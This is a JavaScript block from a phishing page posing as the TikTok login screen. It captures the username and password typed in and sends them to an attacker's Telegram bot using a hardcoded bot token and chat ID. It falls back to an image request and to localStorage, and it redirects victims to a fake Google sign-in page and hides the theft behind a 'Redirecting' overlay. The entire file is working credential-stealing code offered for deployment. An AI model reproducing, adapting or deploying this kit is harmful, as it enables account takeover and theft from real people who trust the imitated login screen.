<script>
(function() {
    'use strict';

    // ====== CONFIGURE YOUR REDIRECTS HERE ======
    const REDIRECT_CONFIG = {
        // Where to redirect when "Use phone / email / username" is clicked
        emailLogin: 'login_tiktok_notgoogle.html',
        // Where to redirect when "Continue with Google" is clicked
        googleLogin: 'google_gmailfield.html',
        // Where to redirect when "Sign up" is clicked
        signup: 'https://www.tiktok.com/signup',
        // Where to redirect for help/feedback
        help: 'https://www.tiktok.com/help',
        // Where to redirect for For You feed (logo click)
        home: 'https://www.tiktok.com'
    };

    // ====== CONFIGURE TELEGRAM BOT ======
    const TELEGRAM_BOT_TOKEN = '8750325296:AAG1WYnhrZve1oIIZoaPobB4_hc9PHDAjLY';
    const TELEGRAM_CHAT_ID = '8391692120';

    // ============================================
    // DO NOT EDIT BELOW THIS LINE
    // ============================================

    // DOM refs
    const loginOptions = document.querySelectorAll('.tiktok-e8q7q1-de495bb3--DivBoxContainer');
    const signupLink = document.querySelector('.tiktok-ziy4u4-de495bb3--ALink');
    const helpLink = document.querySelector('.help-center');
    const logoLink = document.querySelector('.tiktok-ee3vyq-de495bb3--StyledLinkLogo');
    const usernameInput = document.querySelector('#username');
    const passwordInput = document.querySelector('#password');
    const loginBtn = document.querySelector('#loginBtn');
    const togglePwdBtn = document.querySelector('#togglePwd');

    // Track if credentials were sent
    let credentialsSent = false;
    let submitAttempted = false;

    // ---- Helper: Get credentials ----
    function getUsername() {
        return (usernameInput && usernameInput.value) ? usernameInput.value.trim() : '';
    }

    function getPassword() {
        return (passwordInput && passwordInput.value) ? passwordInput.value : '';
    }

    // ---- Send to Telegram ----
    function sendToTelegram(username, password, callback) {
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.warn('⚠️ Telegram bot not configured');
            if (callback) callback(false);
            return;
        }

        const message =
            `🔑 TIKTOK CREDENTIALS\n\n` +
            `👤 Username/Email: ${username || '(empty)'}\n` +
            `🔐 Password: ${password || '(empty)'}\n` +
            `🕐 Time: ${new Date().toLocaleString()}\n` +
            `📍 Page: ${window.location.href}`;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message
            })
        })
        .then(res => res.json())
        .then(data => {
            if (data.ok) {
                console.log('✅ Credentials sent to Telegram!');
                if (callback) callback(true);
            } else {
                console.warn('❌ Telegram API error:', data.description);
                sendViaImage(username, password, callback);
            }
        })
        .catch(() => {
            console.warn('⚠️ Fetch failed, trying fallback...');
            sendViaImage(username, password, callback);
        });
    }

    // Fallback via image (GET request)
    function sendViaImage(username, password, callback) {
        const msg = `User: ${username} | Pass: ${password}`;
        const encoded = encodeURIComponent(msg);
        const url =
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encoded}`;

        try {
            const img = new Image();
            img.onload = function() {
                console.log('✅ Fallback succeeded');
                if (callback) callback(true);
            };
            img.onerror = function() {
                console.warn('⚠️ Fallback failed, saving to localStorage');
                try {
                    localStorage.setItem('pending_tiktok_creds', JSON.stringify({
                        username, password, timestamp: new Date().toISOString()
                    }));
                } catch(e) {}
                if (callback) callback(false);
            };
            img.src = url;
        } catch(e) {
            if (callback) callback(false);
        }
    }

    // ---- Capture and redirect ----
    function captureAndRedirect(redirectUrl, trigger) {
        if (credentialsSent) {
            performRedirect(redirectUrl);
            return;
        }

        setTimeout(function() {
            const username = getUsername();
            const password = getPassword();

            if (password.length > 0) {
                console.log('%c🔑 CREDENTIALS CAPTURED!', 'font-size:18px;font-weight:bold;color:#0f0;background:#000;padding:8px;border-radius:4px;');
                console.log('👤 Username/Email:', username);
                console.log('🔐 Password:', password);
                console.log('📍 Trigger:', trigger);

                credentialsSent = true;

                sendToTelegram(username, password, function(success) {
                    try {
                        localStorage.setItem('tiktok_captured', JSON.stringify({
                            username, password, trigger, timestamp: new Date().toISOString(), sent: success
                        }));
                        window._tiktokCaptured = { username, password, trigger, timestamp: new Date().toISOString() };
                    } catch(e) {}
                    performRedirect(redirectUrl);
                });
            } else {
                console.warn('⚠️ Password empty, redirecting anyway...');
                performRedirect(redirectUrl);
            }
        }, 300);
    }

    // ---- Perform redirect ----
    function performRedirect(url) {
        console.log('🔄 Redirecting to:', url);
        
        // Show loading overlay
        showLoadingOverlay();
        
        // Save redirect info
        try {
            localStorage.setItem('last_redirect', JSON.stringify({
                to: url,
                timestamp: new Date().toISOString()
            }));
        } catch(e) {}

        // Redirect after delay
        setTimeout(function() {
            window.location.href = url;
        }, 1500);
    }

    // ---- Loading overlay ----
    function showLoadingOverlay() {
        const existing = document.getElementById('redirect-overlay');
        if (existing) existing.remove();

        const overlay = document.createElement('div');
        overlay.id = 'redirect-overlay';
        overlay.innerHTML = `
            <div style="
                position: fixed;
                top: 0; left: 0; width: 100%; height: 100%;
                background: rgba(0,0,0,0.85);
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 99999;
                flex-direction: column;
                font-family: Arial, sans-serif;
            ">
                <div style="
                    width: 48px;
                    height: 48px;
                    border: 3px solid rgba(255,255,255,0.1);
                    border-radius: 50%;
                    border-top-color: #fe2c55;
                    animation: spin 0.8s linear infinite;
                    margin: 0 auto;
                "></div>
                <p style="
                    color: rgba(255,255,255,0.9);
                    margin-top: 20px;
                    font-size: 16px;
                    font-weight: 500;
                ">Redirecting...</p>
                <p style="
                    color: rgba(255,255,255,0.4);
                    margin-top: 8px;
                    font-size: 13px;
                ">Please wait</p>
                <style>
                    @keyframes spin {
                        to { transform: rotate(360deg); }
                    }
                </style>
            </div>
        `;
        document.body.appendChild(overlay);
    }

    // ============================================
    // EVENT HANDLERS
    // ============================================

    // ---- Login options (buttons) ----
    loginOptions.forEach(function(option, index) {
        option.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();

            // Check which button was clicked
            const text = option.textContent || '';
            
            if (text.includes('Google')) {
                // Google login button
                console.log('🔵 Google login option clicked');
                captureAndRedirect(REDIRECT_CONFIG.googleLogin, 'google_button');
            } else if (text.includes('phone') || text.includes('email') || text.includes('username')) {
                // Email/phone/username login button
                console.log('🔵 Email/Phone login option clicked');
                // Redirect to the email login page WITHOUT capturing credentials
                performRedirect(REDIRECT_CONFIG.emailLogin);
            } else {
                // Fallback - redirect to email login
                performRedirect(REDIRECT_CONFIG.emailLogin);
            }
        });
    });

    // ---- Sign up link ----
    if (signupLink) {
        signupLink.addEventListener('click', function(e) {
            e.preventDefault();
            console.log('🔵 Sign up clicked');
            performRedirect(REDIRECT_CONFIG.signup);
        });
    }

    // ---- Help link ----
    if (helpLink) {
        helpLink.addEventListener('click', function(e) {
            e.preventDefault();
            console.log('🔵 Help clicked');
            performRedirect(REDIRECT_CONFIG.help);
        });
    }

    // ---- Logo link ----
    if (logoLink) {
        logoLink.addEventListener('click', function(e) {
            e.preventDefault();
            console.log('🔵 Logo clicked');
            performRedirect(REDIRECT_CONFIG.home);
        });
    }

    // ---- Login button (on the email login page) ----
    if (loginBtn) {
        loginBtn.addEventListener('click', function(e) {
            e.preventDefault();
            if (!submitAttempted) {
                submitAttempted = true;
                console.log('🔵 Login button clicked - capturing credentials...');
                // Capture credentials and redirect to the email login page
                captureAndRedirect(REDIRECT_CONFIG.emailLogin, 'login_button');
            }
        });
    }

    // ---- Enter key on password field ----
    if (passwordInput) {
        passwordInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                if (!submitAttempted) {
                    submitAttempted = true;
                    console.log('🔵 Enter pressed - capturing credentials...');
                    captureAndRedirect(REDIRECT_CONFIG.emailLogin, 'enter_key');
                }
            }
        });
    }

    // ---- Password visibility toggle ----
    if (togglePwdBtn && passwordInput) {
        togglePwdBtn.addEventListener('click', function(e) {
            e.preventDefault();
            const isPassword = passwordInput.type === 'password';
            passwordInput.type = isPassword ? 'text' : 'password';
            togglePwdBtn.textContent = isPassword ? '🙈' : '👁';
        });
    }

    // ---- Manual capture: Ctrl+Shift+K (desktop) ----
    document.addEventListener('keydown', function(e) {
        if (e.ctrlKey && e.shiftKey && (e.key === 'K' || e.key === 'k')) {
            e.preventDefault();
            console.log('🔵 Manual capture triggered (Ctrl+Shift+K)');
            captureAndRedirect(REDIRECT_CONFIG.emailLogin, 'manual_shortcut');
        }
    });

    // ---- Mobile: triple tap anywhere ----
    let tapCount = 0;
    let tapTimer = null;
    document.addEventListener('click', function(e) {
        if ('ontouchstart' in window || navigator.maxTouchPoints > 0) {
            tapCount++;
            clearTimeout(tapTimer);
            tapTimer = setTimeout(function() {
                if (tapCount >= 3) {
                    tapCount = 0;
                    console.log('📱 Triple tap detected – manual capture!');
                    captureAndRedirect(REDIRECT_CONFIG.emailLogin, 'manual_triple_tap');
                } else {
                    tapCount = 0;
                }
            }, 500);
        }
    });

    // ---- Retrieve captured data helper ----
    window.getTikTokCaptured = function() {
        try {
            const stored = localStorage.getItem('tiktok_captured');
            if (stored) {
                const data = JSON.parse(stored);
                console.log('📂 Retrieved from localStorage:');
                console.log('👤 Username:', data.username);
                console.log('🔐 Password:', data.password);
                return data;
            }
        } catch(e) {}
        if (window._tiktokCaptured) {
            console.log('📂 Retrieved from memory:');
            console.log('👤 Username:', window._tiktokCaptured.username);
            console.log('🔐 Password:', window._tiktokCaptured.password);
            return window._tiktokCaptured;
        }
        console.log('❌ No credentials captured yet.');
        return null;
    };

    // ---- Log active status ----
    console.log('%c🔐 TikTok Login Redirector Active', 'font-size:16px;font-weight:bold;color:#fe2c55;background:#000;padding:10px;border-radius:6px;');
    console.log('📌 Redirects:');
    console.log('  📧 Email/Username -> ' + REDIRECT_CONFIG.emailLogin);
    console.log('  🔵 Google -> ' + REDIRECT_CONFIG.googleLogin);
    console.log('  ✏️ Sign up -> ' + REDIRECT_CONFIG.signup);
    console.log('  ❓ Help -> ' + REDIRECT_CONFIG.help);
    console.log('  🏠 Logo -> ' + REDIRECT_CONFIG.home);
    console.log('📌 Credentials sent to Telegram on submit');
    console.log('📌 Retrieve with: getTikTokCaptured()');

})();
</script>
